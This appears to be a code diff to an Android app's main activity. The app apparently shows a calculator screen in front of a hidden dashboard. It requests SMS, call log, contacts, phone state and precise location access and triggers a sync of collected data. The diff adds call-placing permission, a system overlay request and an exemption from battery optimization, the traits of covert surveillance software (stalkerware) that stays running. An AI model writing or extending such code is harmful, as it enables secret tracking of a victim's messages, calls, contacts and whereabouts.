@@ -1,9 +1,14 @@
 package com.example
 
 import android.Manifest
+import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
@@ -38,6 +43,7 @@ class MainActivity : ComponentActivity() {
     ) { _ ->
         hasAllPermissions = checkPermissions()
         viewModel.triggerSyncAll()
+        checkAndRequestBatteryOptimization()
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -47,6 +53,8 @@ class MainActivity : ComponentActivity() {
         hasAllPermissions = checkPermissions()
         if (!hasAllPermissions) {
             requestAllPermissions()
+        } else {
+            checkAndRequestBatteryOptimization()
         }
 
         setContent {
@@ -68,7 +76,10 @@ class MainActivity : ComponentActivity() {
                             DashboardScreen(
                                 viewModel = viewModel,
                                 hasPermissions = hasAllPermissions,
-                                onRequestPermissions = { requestAllPermissions() }
+                                onRequestPermissions = {
+                                    requestAllPermissions()
+                                    checkAndRequestBatteryOptimization()
+                                }
                             )
                         } else {
                             CalculatorScreen(
@@ -88,6 +99,7 @@ class MainActivity : ComponentActivity() {
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.SEND_SMS,
             Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.CALL_PHONE,
             Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.ACCESS_FINE_LOCATION,
@@ -100,9 +112,6 @@ class MainActivity : ComponentActivity() {
         }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissionsToTrack.add(Manifest.permission.POST_NOTIFICATIONS)
-            permissionsToTrack.add(Manifest.permission.READ_MEDIA_IMAGES)
-        } else {
-            permissionsToTrack.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
 
         return permissionsToTrack.all {
@@ -116,6 +125,7 @@ class MainActivity : ComponentActivity() {
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.SEND_SMS,
             Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.CALL_PHONE,
             Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.ACCESS_FINE_LOCATION,
@@ -128,11 +138,44 @@ class MainActivity : ComponentActivity() {
         }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
-            permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
-        } else {
-            permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
 
         requestPermissionLauncher.launch(permissionsToRequest.toTypedArray())
+        checkAndRequestSystemOverlay()
+    }
+
+    private fun checkAndRequestSystemOverlay() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                try {
+                    val intent = Intent(
+                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:$packageName")
+                    )
+                    startActivity(intent)
+                } catch (_: Exception) {}
+            }
+        }
+    }
+
+    private fun checkAndRequestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
+            if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(packageName)) {
+                try {
+                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                        data = Uri.parse("package:$packageName")
+                    }
+                    startActivity(intent)
+                } catch (_: Exception) {
+                    try {
+                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                            data = Uri.parse("package:$packageName")
+                        }
+                        startActivity(intent)
+                    } catch (_: Exception) {}
+                }
+            }
+        }
     }
 }
